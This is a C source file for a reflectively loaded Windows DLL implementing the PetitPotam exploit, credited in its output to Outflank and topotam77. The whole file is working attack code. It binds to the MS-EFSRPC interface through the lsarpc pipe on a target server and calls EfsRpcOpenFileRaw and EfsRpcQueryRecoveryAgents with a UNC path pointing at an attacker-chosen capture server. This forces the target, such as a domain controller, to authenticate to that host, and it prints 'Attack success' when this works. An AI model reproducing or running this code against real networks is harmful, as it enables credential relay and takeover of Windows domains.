#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <windows.h> 
#include <stdio.h>

#include "ReflectiveLoader.h"
#include "ms-efsrpc.h"

#pragma comment(lib, "rpcrt4.lib")

#define MAX_BUF 512

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;

EXTERN_C void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
	return(malloc(len));
}

EXTERN_C void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
	free(ptr);
}

void Usage(IN LPWSTR lpProgram) {
	wprintf(L"[>] %s <capture server ip or hostname> <target server ip or hostname>\n", lpProgram);
	wprintf(L"[>] Example: %s 192.168.1.10 dc01.example.local\n\n", lpProgram);
}

LPWSTR Utf8ToUtf16(IN LPSTR lpAnsiString) {
	INT strLen = MultiByteToWideChar(CP_UTF8, 0, lpAnsiString, -1, NULL, 0);
	if (!strLen) {
		return NULL;
	}

	LPWSTR lpWideString = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strLen + 1 * sizeof(WCHAR));
	if (!lpWideString) {
		return NULL;
	}
	MultiByteToWideChar(CP_UTF8, 0, lpAnsiString, -1, lpWideString, strLen);

	return lpWideString;
}

RPC_STATUS CreateBindingHandle(IN LPWSTR lpwTarget, OUT RPC_BINDING_HANDLE* binding_handle) {
	RPC_STATUS rStatus;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = { 0 };
	RPC_WSTR StringBinding = NULL;
	RPC_BINDING_HANDLE Binding;
	SEC_WINNT_AUTH_IDENTITY AuthIdentity = { 0 };

	StringBinding = 0;
	Binding = 0;

	rStatus = RpcStringBindingComposeW((RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpwTarget, (RPC_WSTR)L"\\pipe\\lsarpc", (RPC_WSTR)NULL, &StringBinding);
	if (rStatus == RPC_S_OK) {
		rStatus = RpcBindingFromStringBindingW(StringBinding, &Binding);
		if (!rStatus) {
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			rStatus = RpcBindingSetAuthInfoExW(Binding, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (rStatus == RPC_S_OK) {
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				wprintf(L"[>] RPC Binding successful\n");
			}
		}
	}
	if (Binding) {
		RpcBindingFree(&Binding);
	}

	return rStatus;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	LPWSTR lpwParams = NULL;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		HRESULT hr = S_OK;
		LPWSTR lpwListener = NULL;
		LPWSTR lpwTarget = NULL;
		WCHAR wcRPCTarget[MAX_BUF] = L"\\\\";
		WCHAR wcFileName[MAX_BUF] = { 0 };
		LONG lFlag = 0;

		RPC_BINDING_HANDLE bHandle;
		RPC_STATUS rStatus = RPC_S_NO_BINDINGS;
		PEXIMPORT_CONTEXT_HANDLE pContextHandle = NULL;
		ENCRYPTION_CERTIFICATE_HASH_LIST* pEncCertHashList = NULL;

		if (lpReserved != NULL) {
			LPWSTR* szArglist = NULL;
			INT nArgs = 0;

			// Handle the command line arguments.
			lpwParams = Utf8ToUtf16(lpReserved);
			if (lpwParams == NULL) {
				wprintf(L"\n[!] Failed to convert arguments...\n");
				goto CleanUp;
			}

			szArglist = CommandLineToArgvW(lpwParams, &nArgs);
			wprintf(L"[>] PetitPotam exploit by Cneelis @Outflank\n");
			wprintf(L"[>] Based on original code by @topotam77\n\n");
			if (nArgs < 2) {
				Usage(L"PetitPotam");
				goto CleanUp;
			}
			else {
				lpwListener = szArglist[0];
				lpwTarget = szArglist[1];
			}

			wcscat_s(wcRPCTarget, _countof(wcRPCTarget), lpwTarget);
			rStatus = CreateBindingHandle(wcRPCTarget, &bHandle);
			if (rStatus != RPC_S_OK) {
				wprintf(L"[!] RPC Binding failed...\n\n");
				goto CleanUp;
			}

			swprintf_s(wcFileName, _countof(wcFileName), L"\\\\%s\\C$\\Windows\\Temp\\tmpBla.tmp", lpwListener);
			hr = EfsRpcOpenFileRaw(bHandle, &pContextHandle, wcFileName, lFlag);
			if (hr != ERROR_BAD_NETPATH) {
				hr = EfsRpcQueryRecoveryAgents(bHandle, wcFileName, &pEncCertHashList);
			}

			if (hr == ERROR_BAD_NETPATH) {
				wprintf(L"[>] Attack success!!!\n\n");
			}
		}

	CleanUp:

		// Flush STDOUT
		fflush(stdout);

		// We're done, so let's exit
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
